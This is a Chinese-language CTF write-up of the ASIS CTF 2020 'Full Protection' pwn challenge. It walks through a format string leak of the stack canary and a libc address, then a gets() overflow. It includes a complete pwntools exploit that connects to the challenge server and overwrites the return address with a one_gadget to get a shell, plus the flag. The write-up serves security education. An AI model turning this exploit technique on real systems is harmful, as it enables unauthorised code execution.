---
title: "ASIS CTF 2020 pwn Full Protection Writeup"
date: 2020-07-08T17:51:39+08:00
draft: false
---

# ASIS CTF 2020 pwn Full Protection Writeup

此題為 ASIS 的暖身題，但並非想像中的極易簡單 <br>
不過很裸，測試之後會發現有 format string 的漏洞。 <br>

## 檢查保護機制
首先檢查此程式有開啟那些保護，發現全開，先別緊張，先觀察看看此程式有那裡能夠破解其中的保護
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## 使用 objdump 觀察 source code

使用 objdump 工具 反組譯 `main()` 如下：
```
0000000000000850 <main>:
 850:   66 0f ef c0             pxor   xmm0,xmm0
 854:   53                      push   rbx
 855:   48 83 ec 50             sub    rsp,0x50
 859:   64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
 860:   00 00 
 862:   48 89 44 24 48          mov    QWORD PTR [rsp+0x48],rax
 867:   31 c0                   xor    eax,eax
 869:   0f 29 04 24             movaps XMMWORD PTR [rsp],xmm0
 86d:   48 89 e3                mov    rbx,rsp
 870:   0f 29 44 24 10          movaps XMMWORD PTR [rsp+0x10],xmm0
 875:   0f 29 44 24 20          movaps XMMWORD PTR [rsp+0x20],xmm0
 87a:   0f 29 44 24 30          movaps XMMWORD PTR [rsp+0x30],xmm0
 87f:   eb 27                   jmp    8a8 <main+0x58>
 881:   0f 1f 80 00 00 00 00    nop    DWORD PTR [rax+0x0]
 888:   48 89 de                mov    rsi,rbx
 88b:   bf 01 00 00 00          mov    edi,0x1
 890:   31 c0                   xor    eax,eax
 892:   e8 89 ff ff ff          call   820 <__printf_chk@plt>
 897:   48 8b 35 72 07 20 00    mov    rsi,QWORD PTR [rip+0x200772]        # 201010 <stdout@@GLIBC_2.2.5>
 89e:   bf 0a 00 00 00          mov    edi,0xa
 8a3:   e8 48 ff ff ff          call   7f0 <_IO_putc@plt>
 8a8:   be 40 00 00 00          mov    esi,0x40
 8ad:   48 89 df                mov    rdi,rbx
 8b0:   e8 7b 01 00 00          call   a30 <readline>
 8b5:   85 c0                   test   eax,eax
 8b7:   75 cf                   jne    888 <main+0x38>
 8b9:   31 c0                   xor    eax,eax
 8bb:   48 8b 54 24 48          mov    rdx,QWORD PTR [rsp+0x48]
 8c0:   64 48 33 14 25 28 00    xor    rdx,QWORD PTR fs:0x28
 8c7:   00 00 
 8c9:   75 06                   jne    8d1 <main+0x81>
 8cb:   48 83 c4 50             add    rsp,0x50
 8cf:   5b                      pop    rbx
 8d0:   c3                      ret    
 8d1:   e8 0a ff ff ff          call   7e0 <__stack_chk_fail@plt>
 8d6:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
 8dd:   00 00 00
```

觀察後發現，此 `__printf_chk()` 查詢 Linux Standard Base Core Specification[2] 後發現會引發 format string 漏洞<br>
```C
int __printf_chk(int flag, const char * format);
```
原因在 `__printf_chk()` 第二個參數 `rsi` 為可輸入(or可控)的變數 <br>
```
 888:   48 89 de                mov    rsi,rbx
 88b:   bf 01 00 00 00          mov    edi,0x1
 890:   31 c0                   xor    eax,eax
 892:   e8 89 ff ff ff          call   820 <__printf_chk@plt>
```
往上 trace 會得知 `rbx` 值為 `rsp`，也就是透過此漏洞可以 leak 出 **stack section 的內容**
```shell
$ ./chall
%p %p %p %p %p %p %p %p %p %p
0x7ffcc97bb7b0 0x10 0x7fb1c8a8e8c0 0x7fb1c8c9c500 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025 (nil) (nil)
```

並且發現 `main()` 所呼叫的 `readline()` 並非 import，<br>
使用 objdump trace 一下，發現此程式使用了 `gets()` <br>
```
0000000000000a30 <readline>:
 a30:   55                      push   rbp
 a31:   53                      push   rbx
 a32:   31 c0                   xor    eax,eax
 a34:   48 89 fb                mov    rbx,rdi
 a37:   89 f5                   mov    ebp,esi
 a39:   48 83 ec 08             sub    rsp,0x8
 a3d:   e8 ce fd ff ff          call   810 <gets@plt>
 a42:   48 89 df                mov    rdi,rbx
 a45:   e8 86 fd ff ff          call   7d0 <strlen@plt>
 a4a:   39 e8                   cmp    eax,ebp
 a4c:   7d 07                   jge    a55 <readline+0x25>
 a4e:   48 83 c4 08             add    rsp,0x8
 a52:   5b                      pop    rbx
 a53:   5d                      pop    rbp
 a54:   c3                      ret    
 a55:   48 8d 3d 98 00 00 00    lea    rdi,[rip+0x98]        # af4 <_IO_stdin_used+0x4>
 a5c:   e8 5f fd ff ff          call   7c0 <puts@plt>
 a61:   bf 01 00 00 00          mov    edi,0x1
 a66:   e8 45 fd ff ff          call   7b0 <_exit@plt>
 a6b:   0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
```

## 構造 Payload

根據 CWE (Common Weakness Enumeration) 弱點分類系統，<br>
編號為 CWE-242[1]： **Use of Ingherently Dangerous Function**<br>也就是說，一旦使用了 `gets()`，便會發生 overflow，雖然有開啟 Canary 保護，<br>
然而，此程式有 format string 漏洞，便能 leak 出 Canary。 <br>
<br>
由於 `rbx` 值為 `rsp`，而 `rsp` 值相當於 `rbp-0x50`，<br>
因此構造 payload 如下：
```
aaaaaaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
```
其 Leak 出 Stack 內容如下：
```
aaaaaaaa 0x7ffe915e8330 0x10 0x7f55f21e38c0 0x7f55f23f1500 0x6161616161616161 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x702520 0x7ffe915e8460 0x513bddc1e9390500 (nil) 0x7f55f1e17b97 0x1 0x7ffd7626bab8 0x100008000 0x561ce2198850
```
整理成 stack section 內容如下 (按照下面 gdb 來對齊)： <br>
(位址因為有開ASLR，每一次執行位址都會不同)
```
Address             Contents
--------------------------------------------------
0x7ffe915e8310 <%p> 0x7ffe915e8330    
0x7ffe915e8318 <%p> 0x10
0x7ffe915e8320 <%p> 0x7fbfee8158c0
0x7ffe915e8328 <%p> 0x7fbfeea23500
0x7ffe915e8330 <%p> 0x6161616161616161 <rbp-0x50>
0x7ffe915e8338 <%p> 0x2520702520702520 一堆 "%p "
0x7ffe915e8340 <%p> 0x2070252070252070 一堆 "%p "
0x7ffe915e8348 <%p> 0x7025207025207025 一堆 "%p "
0x7ffe915e8350 <%p> 0x2520702520702520 一堆 "%p "
0x7ffe915e8358 <%p> 0x2070252070252070 一堆 "%p "
0x7ffe915e8360 <%p> 0x7025207025207025 一堆 "%p "
0x7ffe915e8368 <%p> 0x702520           "%p "
0x7ffe915e8370 <%p> 0x7ffe915e8460     <_start>
0x7ffe915e8378 <%p> 0x513bddc1e9390500 <canary>
0x7ffe915e8380 <%p> (nil)
0x7ffe915e8388 <%p> 0x7f55f1e17b97 <__libc_start_main+231> 為 saved rbp
0x7ffe915e8390 <%p> 0x1            <ret>
0x7ffe915e8398 <%p> 0x7ffd7626bab8
0x7ffe915e83a0 <%p> 0x100008000
0x7ffe915e83a8 <%p> 0x561ce2198850
--------------------------------------------------
```

觀察輸入 format string payload 時，可利用的殘留值 <br>
殘留值指的是，當呼叫 import function 時，我們可透過 format string leak 的位址，計算出 library base address，並且在 return 時候，竄改成 do_system() 位址，便能夠取得 shell <br>
因此我們利用 `__libc_start_main()` 來計算 base <br>
此外，若輸入包含 `\x00` 開頭的字串，便能夠繞過長度的檢查
```sh
gdb-peda$ stack 25
0000| 0x7ffff48dcd50 --> 0x7ffff48dcd70 --> 0x6161616161616100 ('')
0008| 0x7ffff48dcd58 --> 0x7ffff48dcd70 --> 0x6161616161616100 ('')
0016| 0x7ffff48dcd60 --> 0x55ee80b9ca70 (<__libc_csu_init>:	push   r15)
0024| 0x7ffff48dcd68 --> 0x55ee80b9c8b5 (<main+101>:	test   eax,eax)
0032| 0x7ffff48dcd70 --> 0x6161616161616100 ('')
0040| 0x7ffff48dcd78 ('a' <repeats 56 times>)
0048| 0x7ffff48dcd80 ('a' <repeats 48 times>)
0056| 0x7ffff48dcd88 ('a' <repeats 40 times>)
0064| 0x7ffff48dcd90 ('a' <repeats 32 times>)
0072| 0x7ffff48dcd98 ('a' <repeats 24 times>)
0080| 0x7ffff48dcda0 ('a' <repeats 16 times>)
0088| 0x7ffff48dcda8 ("aaaaaaaa")
0096| 0x7ffff48dcdb0 --> 0x7ffff48dce00 --> 0x55ee80b9c920 (<_start>:	xor    ebp,ebp)
0104| 0x7ffff48dcdb8 --> 0x659a9a071d0a4d00 
0112| 0x7ffff48dcdc0 --> 0x0 
0120| 0x7ffff48dcdc8 --> 0x7f022ac24b97 (<__libc_start_main+231>:	mov    edi,eax)
0128| 0x7ffff48dcdd0 --> 0x1 
0136| 0x7ffff48dcdd8 --> 0x7ffff48dcea8 --> 0x7ffff48df16e --> 0x6c6c6168632f2e ('./chall')
0144| 0x7ffff48dcde0 --> 0x100008000 
0152| 0x7ffff48dcde8 --> 0x55ee80b9c850 (<main>:	pxor   xmm0,xmm0)
0160| 0x7ffff48dcdf0 --> 0x0 
0168| 0x7ffff48dcdf8 --> 0xf55b7785d276456b 
0176| 0x7ffff48dce00 --> 0x55ee80b9c920 (<_start>:	xor    ebp,ebp)
0184| 0x7ffff48dce08 --> 0x7ffff48dcea0 --> 0x1 
0192| 0x7ffff48dce10 --> 0x0 
```

## Solution
```python=
from pwn import *

one_gadget = 0x4f322
libc_start_main_libc = 0x21ab0

p = remote("69.172.229.147", 9002)

payload = 'a'*8 + ' %p'*18
p.sendline(payload)
leak = p.recvline().split()
canary = int(leak[14], 16)
libc_start_main_address = int(leak[16], 16)
print("canary: ", hex(canary))
print("libc: ", hex(libc_start_main_address))

# calculat libc base address
base = libc_start_main_address - 231 - libc_start_main_libc
shell = base + one_gadget

payload = '\x00' + 'a'*63 + p64(canary) + p64(canary) + 'a'*8 + p64(shell)
p.sendline(payload)
p.interactive()
p.close()

# ASIS{s3cur1ty_pr0t3ct10n_1s_n07_s1lv3r_bull3t}
```
## format string 補充

通常使用到下列 function，必須注意避免 format string 漏洞： <br>
```C
#include <stdio.h>
printf(const char *format, ...);
fprintf(FILE *stream, const char *format, ...);
dprintf(int fd, const char *format, ...);
sprintf(char *str, const char *format, ...);
snprintf(char *str, size_t size, const char *format, ...);
int __printf_chk(int flag, const char * format);

#include <stdarg.h>
vprintf(const char *format, va_list ap);
vfprintf(FILE *stream, const char *format, va_list ap);
vdprintf(int fd, const char *format, va_list ap);
vsprintf(char *str, const char *format, va_list ap);
vsnprintf(char *str, size_t size, const char *format, va_list ap);
```

## 備註
[1] [CWE-242: Use of Ingherently Dangerous Function](https://cwe.mitre.org/data/definitions/242.html) <br>
[2] [Linux Standard Base Core Specification  __printf_chk()](https://refspecs.linuxbase.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/libc---printf-chk-1.html)